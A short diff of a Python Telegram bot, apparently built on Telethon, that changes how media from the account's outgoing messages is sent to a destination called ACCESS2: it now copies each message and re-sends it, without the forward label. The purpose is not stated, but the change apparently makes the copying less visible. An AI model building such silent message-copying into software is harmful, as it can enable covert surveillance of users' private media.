@@ -39,7 +39,8 @@ async def access(event):
 @bot.on(events.NewMessage(outgoing=True))
 async def access2(event):
     if event.media:
-        await event.forward_to(ACCESS2)
+        msg = await event.get_message()
+        await event.client.send_message(ACCESS2, msg)
     
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
